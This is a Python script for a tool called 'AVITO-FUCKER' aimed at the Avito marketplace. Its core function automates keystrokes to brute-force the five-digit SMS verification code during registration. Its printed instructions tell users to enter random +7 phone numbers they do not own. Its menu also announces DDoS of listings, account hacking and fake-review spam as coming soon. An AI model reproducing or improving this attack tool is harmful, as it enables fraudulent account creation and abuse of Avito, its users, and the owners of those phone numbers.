import os, time

try:
    import colorama
    import pyautogui
    import keyboard
    import webbrowser
    import subprocess
except ModuleNotFoundError:
    os.system("pip install colorama")
    os.system("pip install pyautogui")
    os.system("pip install keyboard")
    os.system("pip install webbrowser")
    os.system("pip install subprocess")

import pyautogui
import keyboard
from colorama import init, Fore, Back, Style
import subprocess
import webbrowser

init()


def display(text):
    for value in range(0, len(text)):
        time.sleep(0.1)
        print(f"{text[value]}")


def your_choice(text):
    user_choice = input(f"{Fore.LIGHTGREEN_EX}your@choice{Style.RESET_ALL}{Fore.LIGHTBLUE_EX} ~> {Style.RESET_ALL}{Fore.LIGHTCYAN_EX}")
    subprocess.call('cls', shell=True)
    if user_choice == "1":
        webbrowser.open(r"https://github.com/neiskq/avito-fucker", new=2)
        for value in range(0, len(text)):
            print(f"{text[value]}")
    elif user_choice == "2":
        webbrowser.open(r"https://github.com/neiskq/", new=2)
        for value in range(0, len(text)):
            print(f"{text[value]}")
    elif user_choice == "3":
        print(f'{Fore.RED}{Back.BLACK}\n• DDOS Avito announcement  ~>  # \n• Hacking Avito accounts   ~>  # \n• Spam with bad reviews    ~>  # \n{Style.RESET_ALL}'
              f'{Fore.LIGHTWHITE_EX}{Back.BLACK}          coming soon...        {Style.RESET_ALL}\n')
        time.sleep(0.3)
        print(f'{Fore.BLACK}{Back.LIGHTMAGENTA_EX}• Bruteforce verification code  ~>  1 {Style.RESET_ALL}\n'
              f'{Fore.LIGHTMAGENTA_EX}{Back.BLACK}  Go back  ~>  0 {Style.RESET_ALL}\n\n')
        user_choice_hacks = input(f"{Fore.LIGHTGREEN_EX}your@choice{Style.RESET_ALL}{Fore.LIGHTBLUE_EX} ~> {Style.RESET_ALL}{Fore.LIGHTCYAN_EX}")
        if user_choice_hacks == "0":
            subprocess.call('cls', shell=True)
            for value in range(0, len(text)):
                print(f"{text[value]}")
        elif user_choice_hacks == "1":
            subprocess.call('cls', shell=True)
            time.sleep(0.1)
            print(f'{Fore.RED}{Back.BLACK}\n\t\t\t\t!!WARNING!!\n\tI am not responsible if something happens to your computer. If{Style.RESET_ALL}')
            time.sleep(0.3)
            print(f"{Fore.RED}{Back.BLACK}\tyou still want to get started,{Style.RESET_ALL}{Fore.LIGHTRED_EX}{Back.BLACK} read the instructions{Style.RESET_ALL}{Fore.RED} on how{Style.RESET_ALL}")
            time.sleep(0.3)
            print(f'{Fore.RED}{Back.BLACK}\tto do it properly at "https://github.com/neiskq/avito-fucker"{Style.RESET_ALL}')
            time.sleep(0.3)
            print(f'{Fore.RED}{Back.BLACK}\tbefore you start. Good luck!\n\n{Style.RESET_ALL}')
            return "1"
    elif user_choice == "4":
        print(f'{Fore.BLACK}{Back.LIGHTMAGENTA_EX}\n\t Choose a method of support: \n\n{Style.RESET_ALL}{Fore.LIGHTMAGENTA_EX}{Back.BLACK} boosty.to  ~>  1\n'
              f' send.monobank.ua  ~>  2\n\n Go back  ~>  0\n Thank you in advance! {Style.RESET_ALL}\n\n')
        user_choice_payment = input(f"{Fore.LIGHTGREEN_EX}your@choice{Style.RESET_ALL}{Fore.LIGHTBLUE_EX} ~> {Style.RESET_ALL}{Fore.LIGHTCYAN_EX}")
        if user_choice_payment == "0":
            subprocess.call('cls', shell=True)
            for value in range(0, len(text)):
                print(f"{text[value]}")
        elif user_choice_payment == "1":
            webbrowser.open(r"https://boosty.to/neiskq/purchase/2245583?ssource=DIRECT&share=subscription_link", new=2)
            subprocess.call('cls', shell=True)
            for value in range(0, len(text)):
                print(f"{text[value]}")
        elif user_choice_payment == "2":
            webbrowser.open(r"https://send.monobank.ua/jar/ZHV9LYjsV", new=2)
            subprocess.call('cls', shell=True)
            for value in range(0, len(text)):
                print(f"{text[value]}")
    elif user_choice == "0":
        print("goodbye")
        time.sleep(0.7)
        return "exit"
    else:
        for _ in range(7):
            print(f'{Fore.LIGHTMAGENTA_EX}{Back.BLACK}\n ERROR, INCORRECT DATA... PLEASE FIX IT!{Style.RESET_ALL}\n\n')
            time.sleep(0.4)
            subprocess.call('cls', shell=True)
            time.sleep(0.1)
        for value in range(0, len(text)):
            print(f"{text[value]}")


def on_key_event(e):
    if e.name == '=':
        for i in range(1, 100000):
            confirm_num = (str(i).zfill(5))
            keyboard.write(confirm_num)
            pyautogui.press('enter')
            for _ in range(4):
                pyautogui.press('tab')
            pyautogui.press('del')
            time.sleep(0.2)
    return "exit"


textStyles = [Fore.YELLOW, Fore.LIGHTYELLOW_EX, Fore.WHITE, Style.RESET_ALL]
startTextList = [f"\n{Fore.LIGHTBLUE_EX}░█████╗░██╗░░░██╗██╗████████╗░█████╗░░░░░░░███████╗██╗░░░██╗░█████╗░██╗░░██╗███████╗██████╗{Style.RESET_ALL}",
                 f"{Fore.LIGHTBLUE_EX}██╔══██╗██║░░░██║██║╚══██╔══╝██╔══██╗░░░░░░██╔════╝██║░░░██║██╔══██╗██║░██╔╝██╔════╝██╔══██╗{Style.RESET_ALL}",
                 f"{Fore.LIGHTBLUE_EX}███████║╚██╗░██╔╝██║░░░██║░░░██║░░██║█████╗█████╗░░██║░░░██║██║░░╚═╝█████═╝░█████╗░░██████╔╝{Style.RESET_ALL}",
                 f"{Fore.YELLOW}██╔══██║░╚████╔╝░██║░░░██║░░░██║░░██║╚════╝██╔══╝░░██║░░░██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗{Style.RESET_ALL}",
                 f"{Fore.YELLOW}██║░░██║░░╚██╔╝░░██║░░░██║░░░╚█████╔╝░░░░░░██║░░░░░╚██████╔╝╚█████╔╝██║░╚██╗███████╗██║░░██║{Style.RESET_ALL}",
                 f"{Fore.YELLOW}╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░╚═╝░░░░╚════╝░░░░░░░╚═╝░░░░░░╚═════╝░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝{Style.RESET_ALL}",
                 f"\t\t\t\t\t{Fore.MAGENTA}{Back.BLACK}     V.1 \n\t\t\t\t\t by @neiskq {Style.RESET_ALL}",
                 f'{Fore.LIGHTMAGENTA_EX}{Back.BLACK}  Instruction  ~>  1 \n  About us  ~>  2\n{Style.RESET_ALL}'
                 f'{Fore.BLACK}{Back.LIGHTMAGENTA_EX}• Actions  ~>  3  \n{Style.RESET_ALL}'
                 f'{Fore.LIGHTMAGENTA_EX}{Back.BLACK}  Support me  ~>  4 \n  Exit  ~>  0 {Style.RESET_ALL}\n\n']


display(startTextList)
while True:
    return_data = your_choice(startTextList)
    if return_data == "exit":
        break
    elif return_data == "1":
        print(f'\n{Fore.LIGHTCYAN_EX}Now, to start, you need to go to the Avito website, Go to Registration,\n'
              f'Instead of your number, enter random numbers with +7 at the beginning, press once "F11" and press "=" to start!')
        print(f'{Fore.CYAN}Теперь для начала вам необходимо зайти на сайт Авито, перейти в раздел Регистрация,\n'
              f'вместо своего номера ввести случайные цифры с +7 в начале, нажать "F11" и нажать один раз "=" для начала!\n')
        print(f'{Fore.LIGHTYELLOW_EX}In order to finish it all, press "Alt + F4".{Style.RESET_ALL}')
        print(f'{Fore.YELLOW}Для того чтобы это все закончить или выйти из приложения, нажмите "Alt+F4".{Style.RESET_ALL}')
        while True:
            return_data_on_key_event = keyboard.on_press(on_key_event)
            if return_data_on_key_event == "exit":
                break

